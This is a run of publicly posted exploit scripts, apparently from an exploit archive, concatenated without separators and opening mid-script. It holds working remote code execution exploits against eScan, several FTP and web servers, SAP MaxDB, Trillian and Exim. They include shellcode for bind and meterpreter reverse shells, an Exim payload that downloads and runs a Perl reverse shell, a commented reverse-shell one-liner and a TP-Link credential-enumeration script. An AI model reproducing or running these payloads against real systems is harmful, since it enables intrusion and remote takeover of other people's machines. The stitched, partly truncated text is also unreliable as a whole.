print "[+] Sending payload..."
s.send('CWD ' + payload + '\r\n') 
try:
	s.recv(1024)
	print "[!] Exploit failed..."
except:
	print "[+] Exploited ^_^"#!/usr/bin/env python
import sys
from socket import *

#auther: Mohammed almutairi
#(Sa.attacker@gmail.com)
"""
MicroWorld eScan Antivirus < 3.x  Remote Root Command Execution
Package MWADMIN package vulnerabilities (linux)
The Base Packages (MWADMIN and MWAV) must be installed before eScan
Link:
http://www.escanav.com/english/content/products/escan_linux/linux_products.asp
infcted: aLL version 3.X eScan linux
1-Escan for Linux Desktop
2-Escan for Linux file Servers
3-MailScan for Linux and webscan
Tested On RedHat  and Fedora
ULTRA PRIV8 :)

Description:

From /opt/MicroWorld/var/www/htdocs/forgotpassword.php:
include("common_functions.php");  <---> (1)

if ($_POST['forgot'] == "Send Password")
{
        $user = $_POST["uname"]; <--->(2) insecure:(


vulnerable code in forgotpassword.php and common_functions.php 
in (1) $runasroot = "/opt/MicroWorld/sbin/runasroot";
we can injection through via the file forgotpassword.php As you can see (2)
with  remote root Command Execution
>> eScan.py www.***.com
eScan@/bin/sh:$Sa$ => reboot
[*] Done! sent to: www.***.com
"""

def xpl():
	if len(sys.argv) < 2:
                print "[*] MicroWorld eScan Antivirus Remote Root Command Execution"
                print "[*] exploited by Mohammed almutairi"
		print "[*] usage: %s host" % sys.argv[0]
		return

	host = sys.argv[1]
	port = 10080 # default port
	cmd = raw_input("eScan@/bin/sh:$Sa$ => ")
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host,port))
        sh="/opt/MicroWorld/sbin/runasroot /bin/sh -c '%s'" % cmd

        sa= "uname=;%s;" %sh # (;sh;)  ---> Here Play See to ^(2)^
        sa+= "&forgot=Send+Password"
        
        s="POST /forgotpassword.php HTTP/1.1\r\n"
        s+="Host: %s:%d\r\n"%(host, port)
        s+="User-Agent: */*\r\n"
        s+="Accept: ar,en-us;q=0.7,en;q=0.3\r\n"
        s+="Content-Type: application/x-www-form-urlencoded\r\n"
        s+="Content-Length: %d \r\n\r\n"%len(sa)
        s+=sa

	sock.sendall(s)
	print "[*] Done! sent to: %s" % host
	sock.close()

if __name__=="__main__":
        xpl()
	sys.exit(0)# Exploit Title : eDisplay Personal FTP server 1.0.0 Multiple Post-Authentication Stack BOF
# Type of sploit: Remote Code Execution
# Bug found by  : loneferret  (march 19, 2010)
# Reference     : http://www.exploit-db.com/exploits/11810
# Exploit date  : March 24, 2010
# Author        : Sud0
# Version       : 1.0.0
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Greetz to     : corelanc0d3r and of course my friends and .... first of all my wife for supporting me and my obsession :)
# Change IP and ftp account according to your server

import socket
 
junk="B" * 37 #seh overwritten after 37 bytes
nseh= "\x74\x20\x74\x20" # jmp forward (used a JE to avoid Bad Chars)
seh= "\x69\x40\x2b\x20" # ppr from 

#shellcode for calc.exe encoded with Alpha2 basereg = eax
shellcode="PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJILKJLV5LKJL3XQ0WPQ0FOCXU33Q2LSSLMPEZXV0NX9WMCIRSGKO8PA" 

#shellcode to align eax for decoder
align="\x5A\x5A\x5A\x52\x58\x2D\x3B\x55\x55\x55\x2D\x3B\x55\x55\x55\x2D\x3B\x55\x55\x55"

buffer= junk+nseh+seh + "C"* 26  + align + "C" * 25 + shellcode + "A" * 50

print "Sending Exploit .... \r\n"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.101',21))
s.recv(1024)
s.send('USER fox\r\n')
s.recv(1024)
s.send('PASS mulder\r\n')
s.recv(1024)
s.send('RMD ' + buffer + '\r\n')
s.close
#!/usr/bin/python

# Exploit title: SAP MaxDB Malformed Handshake Request Remote Code Execution
# Date: 2010.03.26
# Author: S2 Crew [Hungary]
# Software link: sap.com<http://sap.com>
# Version: 7.7.06.09
# Tested on: Windows XP SP2 EN
# CVE: ZDI-10-032
# Code:
#############################################################
# Trying 172.16.29.133...
# Connected to 172.16.29.133.
# Escape character is '^]'.
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\sdb\data\wrk>
#############################################################

import socket
import sys
import os

sc = (
"\x31\xc9\xda\xda\xbe\x94\x3f\xbe\xea\xb1\x56\xd9\x74\x24\xf4"
"\x5f\x31\x77\x17\x03\x77\x17\x83\xef\xfc\x76\xca\x42\x02\xff"
"\x35\xbb\xd3\x9f\xbc\x5e\xe2\x8d\xdb\x2b\x57\x01\xaf\x7e\x54"
"\xea\xfd\x6a\xef\x9e\x29\x9c\x58\x14\x0c\x93\x59\x99\x90\x7f"
"\x99\xb8\x6c\x82\xce\x1a\x4c\x4d\x03\x5b\x89\xb0\xec\x09\x42"
"\xbe\x5f\xbd\xe7\x82\x63\xbc\x27\x89\xdc\xc6\x42\x4e\xa8\x7c"
"\x4c\x9f\x01\x0b\x06\x07\x29\x53\xb7\x36\xfe\x80\x8b\x71\x8b"
"\x72\x7f\x80\x5d\x4b\x80\xb2\xa1\x07\xbf\x7a\x2c\x56\x87\xbd"
"\xcf\x2d\xf3\xbd\x72\x35\xc0\xbc\xa8\xb0\xd5\x67\x3a\x62\x3e"
"\x99\xef\xf4\xb5\x95\x44\x73\x91\xb9\x5b\x50\xa9\xc6\xd0\x57"
"\x7e\x4f\xa2\x73\x5a\x0b\x70\x1a\xfb\xf1\xd7\x23\x1b\x5d\x87"
"\x81\x57\x4c\xdc\xb3\x35\x19\x11\x89\xc5\xd9\x3d\x9a\xb6\xeb"
"\xe2\x30\x51\x40\x6a\x9e\xa6\xa7\x41\x66\x38\x56\x6a\x96\x10"
"\x9d\x3e\xc6\x0a\x34\x3f\x8d\xca\xb9\xea\x01\x9b\x15\x45\xe1"
"\x4b\xd6\x35\x89\x81\xd9\x6a\xa9\xa9\x33\x1d\xee\x67\x67\x4d"
"\x98\x85\x97\x63\x04\x03\x71\xe9\xa4\x45\x29\x86\x06\xb2\xe2"
"\x31\x79\x90\x5e\xe9\xed\xac\x88\x2d\x12\x2d\x9f\x1d\xbf\x85"
"\x48\xd6\xd3\x11\x68\xe9\xfe\x31\xe3\xd1\x68\xcb\x9d\x90\x09"
"\xcc\xb7\x43\xaa\x5f\x5c\x94\xa5\x43\xcb\xc3\xe2\xb2\x02\x81"
"\x1e\xec\xbc\xb4\xe3\x68\x86\x7d\x3f\x49\x09\x7f\xb2\xf5\x2d"
"\x6f\x0a\xf5\x69\xdb\xc2\xa0\x27\xb5\xa4\x1a\x86\x6f\x7e\xf0"
"\x40\xf8\x07\x3a\x53\x7e\x08\x17\x25\x9e\xb8\xce\x70\xa0\x74"
"\x87\x74\xd9\x69\x37\x7a\x30\x2a\x47\x31\x19\x1a\xc0\x9c\xcb"
"\x1f\x8d\x1e\x26\x63\xa8\x9c\xc3\x1b\x4f\xbc\xa1\x1e\x0b\x7a"
"\x59\x52\x04\xef\x5d\xc1\x25\x3a\x57")

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

host = "172.16.29.133"
port =  7210

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

ret = "\x08\xf1\xa0\x00" # HC

packet = (
"\x63\x00\x00\x00\x03\x2f\x00\x00\x01\x00\x00\x00"
"\xff\xff\xff\xff\x00\x00\x04\x00\x63\x00\x00\x00"
"\x00\x02\x4b\x00\x04\x09\x00\x00\x44\x20\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff"
"\x6d\x61" + ret + "\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x07\x49" + "A"*5000 + "T00WT00W" + sc + "\x41" * 2500 + egghunter + "\x90"*2500)

s.send(packet)
s.close()




import urllib2
from time import sleep

#########################################################################################################################################
# Title************************Windows Light HTTPD v0.1 HTTP GET Buffer Overflow
# Discovered and Reported******24th of April, 2013 
# Discovered/Exploited By******Jacob Holcomb/Gimppy042
# Software Vendor**************http://sourceforge.net/projects/lhttpd/?source=navbar
# Exploit/Advisory*************http://infosec42.blogspot.com/
# Software*********************Light HTTPD v0.1
# Tested Platform**************Windows XP Professional SP2
# Date*************************24/04/2013
#
#PS - This is a good piece of software to practice Stack Based Buffer Overflows if you curiouz and want to learnz
#########################################################################################################################################
# Exploit-DB Note: Offset 255 for Windows XP SP3
# jmp esp ntdll 0x7c31fcd8
# payload = "\x90" * 255 + "\xd8\xfc\x91\x7c" + "\x90" * 32 + shellcode

def targURL():

	while True:
	
		URL = raw_input("\n[*] Please enter the URL of the Light HTTP server you would like to PWN. Ex. http://192.168.1.1\n\n>")
		if len(URL) != 0 and URL[0:7] == "http://":
			break
			
		else:
			print "\n\n[!!!] Target URL cant be null and must contain http:// or https:// [!!!]\n"
			sleep(1)
			
	return str(URL)	
	
	
def main():

	target = targURL()
	# msfpayload windows/shell_bind_tcp EXITFUNC=thread LPORT=1337 R | msfencode -c 1 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xff\x20" R
	shellcode = "\xb8\x3b\xaf\xc1\x8a\xdb\xcd\xd9\x74\x24\xf4\x5a\x29\xc9"
	shellcode += "\xb1\x56\x83\xc2\x04\x31\x42\x0f\x03\x42\x34\x4d\x34\x76"
	shellcode += "\xa2\x18\xb7\x87\x32\x7b\x31\x62\x03\xa9\x25\xe6\x31\x7d"
	shellcode += "\x2d\xaa\xb9\xf6\x63\x5f\x4a\x7a\xac\x50\xfb\x31\x8a\x5f"
	shellcode += "\xfc\xf7\x12\x33\x3e\x99\xee\x4e\x12\x79\xce\x80\x67\x78"
	shellcode += "\x17\xfc\x87\x28\xc0\x8a\x35\xdd\x65\xce\x85\xdc\xa9\x44"
	shellcode += "\xb5\xa6\xcc\x9b\x41\x1d\xce\xcb\xf9\x2a\x98\xf3\x72\x74"
	shellcode += "\x39\x05\x57\x66\x05\x4c\xdc\x5d\xfd\x4f\x34\xac\xfe\x61"
	shellcode += "\x78\x63\xc1\x4d\x75\x7d\x05\x69\x65\x08\x7d\x89\x18\x0b"
	shellcode += "\x46\xf3\xc6\x9e\x5b\x53\x8d\x39\xb8\x65\x42\xdf\x4b\x69"
	shellcode += "\x2f\xab\x14\x6e\xae\x78\x2f\x8a\x3b\x7f\xe0\x1a\x7f\xa4"
	shellcode += "\x24\x46\x24\xc5\x7d\x22\x8b\xfa\x9e\x8a\x74\x5f\xd4\x39"
	shellcode += "\x61\xd9\xb7\x55\x46\xd4\x47\xa6\xc0\x6f\x3b\x94\x4f\xc4"
	shellcode += "\xd3\x94\x18\xc2\x24\xda\x33\xb2\xbb\x25\xbb\xc3\x92\xe1"
	shellcode += "\xef\x93\x8c\xc0\x8f\x7f\x4d\xec\x5a\x2f\x1d\x42\x34\x90"
	shellcode += "\xcd\x22\xe4\x78\x04\xad\xdb\x99\x27\x67\x6a\x9e\xe9\x53"
	shellcode += "\x3f\x49\x08\x64\xba\xb0\x85\x82\xae\xd2\xc3\x1d\x46\x11"
	shellcode += "\x30\x96\xf1\x6a\x12\x8a\xaa\xfc\x2a\xc4\x6c\x02\xab\xc2"
	shellcode += "\xdf\xaf\x03\x85\xab\xa3\x97\xb4\xac\xe9\xbf\xbf\x95\x7a"
	shellcode += "\x35\xae\x54\x1a\x4a\xfb\x0e\xbf\xd9\x60\xce\xb6\xc1\x3e"
	shellcode += "\x99\x9f\x34\x37\x4f\x32\x6e\xe1\x6d\xcf\xf6\xca\x35\x14"
	shellcode += "\xcb\xd5\xb4\xd9\x77\xf2\xa6\x27\x77\xbe\x92\xf7\x2e\x68"
	shellcode += "\x4c\xbe\x98\xda\x26\x68\x76\xb5\xae\xed\xb4\x06\xa8\xf1"
	shellcode += "\x90\xf0\x54\x43\x4d\x45\x6b\x6c\x19\x41\x14\x90\xb9\xae"
	shellcode += "\xcf\x10\xd9\x4c\xc5\x6c\x72\xc9\x8c\xcc\x1f\xea\x7b\x12"
	shellcode += "\x26\x69\x89\xeb\xdd\x71\xf8\xee\x9a\x35\x11\x83\xb3\xd3"
	shellcode += "\x15\x30\xb3\xf1"
	
	#7C941EED   FFE4             JMP ESP ntdll.dll
	payload = "\x90" * 258 + "\xED\x1E\x94\x7C" + "\x90" * 32 + shellcode
	port = ":3000/"
	sploit = target + port + payload
	
	try:
		print "\n[*] Preparing to send Evil PAYLoAd to %s!\n[*] Payload Length: %d\n[*] Waiting..." % (target[7:], len(sploit))
		httpRequest = urllib2.Request(sploit)
		sploit = urllib2.urlopen(httpRequest, None, 6)
	except(urllib2.URLError):
		print "\n[!!!] Error. Please check that the Light HTTP Server is online [!!!]\n" 
	except:	
		print "\n[!!!] The server did not respond, but the payload was sent. F!ng3r$ Cr0$$3d 4 c0d3 Ex3cut!0n! [!!!]\n"
		
	
	
if __name__ == "__main__":
	main()	
source: http://www.securityfocus.com/bid/12703/info

A remote buffer overflow vulnerability affects Cerulean Studios Trillian. This issue is due to a failure of the application to securely copy image data into finite process buffers.

An attacker may leverage this issue to execute arbitrary code with the privileges of an unsuspecting user that activated the vulnerable application. 

#########################################
#                                                                                        #
#                      See-security Technologies ltd.                       #
#                                                                                        #
#                      http://www.see-security.com                         #
#                                                                                        #
#########################################
#                                                                                        #
#   Trillian 3.0 PNG Image Processing Buffer overflow Exploit   #
#                                                                                        #
#                                                                                        #
#                Discovered and coded by: Tal zeltzer                   #
#                                                                                        #
#########################################

import sys
import struct

# Addresses are compatible with Windows XP Service Pack 1
ReturnAddress = 0x77D7A145 # Address of "jmp esp" in ntdll.dll 
SystemAddress = 0x77C28044 # Address Of the system() function

# PNG Header
PngOfDeath = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52"
PngOfDeath += "\x00\x00\x00\x40\x00\x00\x00\x40\x08\x03\x00\x00\x00\x9D\xB7\x81"
PngOfDeath += "\xEC\x00\x00\x01\xB9\x74\x52\x4E\x53"

# Nops
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# system(calc) shellcode
PngOfDeath += "\x33\xC0\x50\x68\x63\x61\x6c\x63\x54\x5b\x50\x53\xb9"
PngOfDeath += struct.pack("<L",SystemAddress)
PngOfDeath += "\xFF\xD1"

# Junk Data
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# Return Address
PngOfDeath += struct.pack("<L",ReturnAddress)

# Jump Back Shellcode
PngOfDeath += "\x54\x59\xFE\xCD\x89\xE5\xFF\xE1"

# End Of File
PngOfDeath += "\x90\x90\x90\x59\xE8\x47\xFE\xFF\xFF"

fileOut = open("Trillian.png","wb")
fileOut.write(PngOfDeath)
fileOut.close()#!/usr/bin/python
# BulletProof FTP (Client) V2.45 0day Buffer Overflow PoC Exploit
# Vendor URL: http://www.bpftp.com/
# Bug discovered by h07 <h07@interia.pl>
# Shellcode type: Windows Execute Command (calc.exe) thx metasploit.com
# Tested on 2000 SP4 Polish
# Details:
#
# buffer = "220 " + ("A" * 4112) + "\r\n"
# 41414141  Pointer to next SEH record
# 41414141  SE handler
##

from socket import *
from struct import pack
from time import sleep

shellcode = (
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

host = "0.0.0.0"
port = 21
LEN = 4104
NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
SE_HANDLER = 0x77585A69       # POP POP RET (2000 SP4 Polish) 

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]

buffer = "220 "
buffer += "A" * LEN
buffer += pack("<L", NEXT_SEH_RECORD)
buffer += pack("<L", SE_HANDLER)
buffer += shellcode
buffer += "\r\n"

cl.send(buffer)
print "[+] Sending buffer: OK\n"

sleep(1)
cl.close()
s.close()

# EoF

# milw0rm.com [2006-10-12]
# Exploit Title: Intrasrv Simple Web Server 1.0 SEH based Remote Code Execution BOF

# Date: 29.05.2013

# Exploit Author: xis_one@STM Solutions

# Vendor Homepage: http://www.leighb.com/intrasrv.htm

# Software Link: http://www.leighb.com/intrasrv.zip

# Version: 1.0

# Tested on: Windows XP SP3 Eng


# Movie:http://www.youtube.com/watch?v=NvCPYA6T9l0&feature=youtu.be



#!/usr/bin/python

import socket

import os

import sys



target="192.168.1.16"


#W00T

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7" + "\x90"*94

nseh="\xEB\x80\x90\x90"#jmp back do egghunter

seh="\xdd\x97\x40\x00"  #0x004097dd, # pop eax # pop ebp # ret  - intrasrv.exe

crash = "\x90"*1427 + egghunter + nseh + seh + "\x90"*2439 #4000 bytes


#windows/meterpreter/reverse_tcp lhost=192.168.1.15 lport=31337 R | msfencode -t c -b '\x56' -e x86/alpha_mixed

shellcode = ("T00WT00W" +

"\x89\xe2\xda\xcf\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49\x49"

"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"

"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"

"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"

"\x59\x6c\x4b\x58\x4e\x69\x47\x70\x55\x50\x53\x30\x75\x30\x4e"

"\x69\x6b\x55\x64\x71\x78\x52\x73\x54\x4e\x6b\x51\x42\x64\x70"

"\x4e\x6b\x32\x72\x44\x4c\x6e\x6b\x62\x72\x45\x44\x6c\x4b\x30"

"\x72\x77\x58\x36\x6f\x38\x37\x32\x6a\x74\x66\x65\x61\x79\x6f"

"\x70\x31\x49\x50\x4c\x6c\x47\x4c\x63\x51\x51\x6c\x65\x52\x66"

"\x4c\x71\x30\x4b\x71\x48\x4f\x44\x4d\x55\x51\x6a\x67\x69\x72"

"\x4c\x30\x31\x42\x46\x37\x4c\x4b\x33\x62\x36\x70\x6e\x6b\x50"

"\x42\x75\x6c\x66\x61\x6a\x70\x6e\x6b\x47\x30\x51\x68\x4e\x65"

"\x69\x50\x42\x54\x71\x5a\x35\x51\x38\x50\x52\x70\x6c\x4b\x32"

"\x68\x67\x68\x4c\x4b\x71\x48\x35\x70\x77\x71\x39\x43\x58\x63"

"\x47\x4c\x47\x39\x4c\x4b\x37\x44\x4e\x6b\x65\x51\x79\x46\x30"

"\x31\x49\x6f\x46\x51\x59\x50\x4e\x4c\x59\x51\x4a\x6f\x64\x4d"

"\x36\x61\x5a\x67\x30\x38\x49\x70\x34\x35\x4a\x54\x55\x53\x61"

"\x6d\x39\x68\x47\x4b\x73\x4d\x37\x54\x32\x55\x59\x72\x63\x68"

"\x4c\x4b\x32\x78\x57\x54\x63\x31\x59\x43\x31\x76\x6c\x4b\x36"

"\x6c\x72\x6b\x4e\x6b\x33\x68\x65\x4c\x65\x51\x4a\x73\x6c\x4b"

"\x44\x44\x6c\x4b\x36\x61\x4a\x70\x6c\x49\x61\x54\x64\x64\x66"

"\x44\x61\x4b\x31\x4b\x65\x31\x52\x79\x51\x4a\x62\x71\x69\x6f"

"\x49\x70\x46\x38\x33\x6f\x53\x6a\x4e\x6b\x67\x62\x58\x6b\x4e"

"\x66\x53\x6d\x35\x38\x45\x63\x55\x62\x33\x30\x67\x70\x33\x58"

"\x53\x47\x64\x33\x54\x72\x31\x4f\x33\x64\x72\x48\x42\x6c\x31"

"\x67\x65\x76\x73\x37\x6b\x4f\x39\x45\x4d\x68\x5a\x30\x47\x71"

"\x37\x70\x77\x70\x74\x69\x59\x54\x62\x74\x42\x70\x42\x48\x64"

"\x69\x4b\x30\x30\x6b\x37\x70\x79\x6f\x58\x55\x32\x70\x42\x70"

"\x30\x50\x76\x30\x37\x30\x42\x70\x77\x30\x72\x70\x63\x58\x4b"

"\x5a\x34\x4f\x39\x4f\x79\x70\x79\x6f\x4e\x35\x6d\x47\x33\x5a"

"\x34\x45\x71\x78\x4b\x70\x6f\x58\x57\x71\x46\x6f\x42\x48\x54"

"\x42\x47\x70\x43\x4a\x72\x49\x4e\x69\x6a\x46\x31\x7a\x34\x50"

"\x31\x46\x70\x57\x73\x58\x6e\x79\x4f\x55\x63\x44\x35\x31\x6b"

"\x4f\x69\x45\x4d\x55\x6b\x70\x44\x34\x74\x4c\x6b\x4f\x50\x4e"

"\x67\x78\x71\x65\x4a\x4c\x63\x58\x58\x70\x38\x35\x49\x32\x51"

"\x46\x59\x6f\x6e\x35\x51\x7a\x63\x30\x70\x6a\x66\x64\x53\x66"

"\x50\x57\x45\x38\x44\x42\x39\x49\x68\x48\x43\x6f\x4b\x4f\x6e"

"\x35\x4c\x4b\x64\x76\x30\x6a\x73\x70\x33\x58\x73\x30\x66\x70"

"\x67\x70\x55\x50\x72\x76\x42\x4a\x67\x70\x75\x38\x63\x68\x69"

"\x34\x50\x53\x68\x65\x4b\x4f\x49\x45\x7a\x33\x71\x43\x73\x5a"

"\x57\x70\x73\x66\x61\x43\x42\x77\x50\x68\x63\x32\x6b\x69\x79"

"\x58\x31\x4f\x39\x6f\x4a\x75\x35\x51\x4f\x33\x36\x49\x38\x46"

"\x4c\x45\x59\x66\x42\x55\x4a\x4c\x4f\x33\x41\x41")


buffer="GET / HTTP/1.1\r\n"

buffer+="Host: " + crash + "\r\n"

buffer+="Content-Type: application/x-www-form-urlencoded\r\n"

buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"

buffer+="Content-Length: 1048580\r\n\r\n"

buffer+=shellcode

one = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

one.connect((target, 80))

one.send(buffer)

one.close()
#!/usr/bin/env python

##################################################################################
##      Exim sender_address Parameter - Remote Command Execution Exploit        ##
##################################################################################
##                                                                              ##
## Vulnerability found by RedTeam Pentesting GmbH                               ##
## https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/              ##
##                                                                              ##
## Exploit written by eKKiM                                                     ##
## http://rdtx.eu/exim-with-dovecot-lda-rce-exploit/                            ##
##                                                                              ## 
##################################################################################
##                                    USAGE                                     ##
##################################################################################
##                                                                              ##
## Edit the PERL REVERSE SHELL MY_CONNECTBACK_IP and MY_CONNECTBACK_PORT and   ##
## upload this perl reverse shell script to a webserver.                        ##
##                                                                              ## 
## Edit the PERL_SHELL variable to your own connectback script URL              ##
##                                                                              ##
## Start a listener: nc -vvn -l -p CONNECT_BACK_PORT                            ##
##                                                                              ## 
## Let the exploitin begin                                                      ##
##                                                                              ## 
##################################################################################


####### PERL REVERSE SHELL #######
## use Socket;$i="MY_CONNECTBACK_IP";$p=MY_CONNECTBACK_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
####### PERL REVERSE SHELL #######


import socket
import sys

####### URL TO YOUR CONNECTBACK SHELL #######
PERL_SHELL = "myhost.com/shell.pl"
####### URL TO YOUR CONNECTBACK SHELL #######

if len(sys.argv) != 2:
	print "Usage: exim_exploit.py <target_ip> <optional_rcpt_address>"
	print " <target_ip> target you want to test"
	print " <optional_rcpt_address> an address which is accepted by exim (default: postmaster@localhost)"
	exit(1)

RCPT_TO = "postmaster@localhost" 
HOST = sys.argv[1]
PORT = 25

def read_line(s):
    ret = ''

    while True:
        c = s.recv(1)

        if c == '\n' or c == '':
            break
        else:
            ret += c

    return ret


if len(sys.argv) == 3:
	RCPT_TO = sys.argv[2]
	
print "Exim sender_address Parameter - Remote Command Execution Exploit"
print "Bug discovered by RedTeam Pentesting GmbH"
print "Exploit created by eKKiM"
print ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = read_line(s);
if not(data.startswith("220")):
	print "[ERROR] Is it SMTP Server?"
	exit(1)
	
s.send("EHLO domain.local\n")
s.recv(4096)

s.send("MAIL FROM: x`wget${IFS}-O${IFS}/tmp/p.pl${IFS}" + PERL_SHELL + "``perl${IFS}/tmp/p.pl`@blaat.com\n")

data = read_line(s);
if not(data.startswith("250")):
	print "[ERROR] MAIL FROM not accepted"
	exit(1)

s.send("RCPT TO: " + RCPT_TO + "\n")
data = read_line(s);
if not(data.startswith("250")):
	print "[ERROR] RCPT_TO not accepted"
	exit(1)

s.send("DATA\n")
data = read_line(s);
if not(data.startswith("354")):
	print "[ERROR] Cannot send email content"
	exit(1)
	
s.send("x\n.\n")
data = read_line(s);
if not(data.startswith("250")):
	print "[ERROR] email content revoked"
	exit(1)
	
print "[OK] Recieved shell?"

s.close()# Exploit Title: TP-Link Print Server Sensitive Information Enumeration
# Exploit Author: SANTHO
# Vendor Homepage: http://www.tp-link.com
# Software Link: http://www.tp-link.com/en/products/details/?model=TL-PS110U
# Version: TL PS110U
TP-Link TL PS110U Print Server runs telnet service which enables an
attacker to access the configuration details without authentication. The
PoC can extract device name, MAC address, manufacture name, Printer model,
and SNMP Community Strings.

*Sample Output*

root@bt# ./tplink-enum.py 10.0.0.2

Device Name : 1P_PrintServABCD

Node ID : AA-AA-AA-AA-AA-AA

Manufacture: Hewlett-Packard

Model: HP LaserJet M1005

Community 1: public Read-Only

Community 2: public Read-Only

import telnetlib
import sys
host = sys.argv[1]
tn = telnetlib.Telnet(host)
tn.read_until("Password:")
tn.write("\r\n")
tn.read_until("choice")
tn.write("1\r\n")
tn.read_until("choice")
tn.write("1\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
	if "Device Name" in i:
		print i.strip()
	if "Node ID" in i:
		print i.strip()
tn.write("0\r\n")
tn.read_until("choice")
tn.write("2\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
	if "Manufacture:" in i:
		print i.strip()
	if "Model:" in i:
		print i.strip()
tn.write("0\r\n")
tn.read_until("choice")
tn.write("5\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
	if "Community" in i:
		print i.strip()#!/usr/bin/env python

import signal
from time import sleep
from socket import *
from sys import exit, exc_info

#
# Title************************PCMan FTP Server v2.0.7 Remote Root Shell Exploit - USER Command
# Discovered and Reported******June 2013 
# Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
# Exploit/Advisory*************http://infosec42.blogspot.com/
# Software*********************PCMan FTP Server v2.0.7 (Listens on TCP/21)
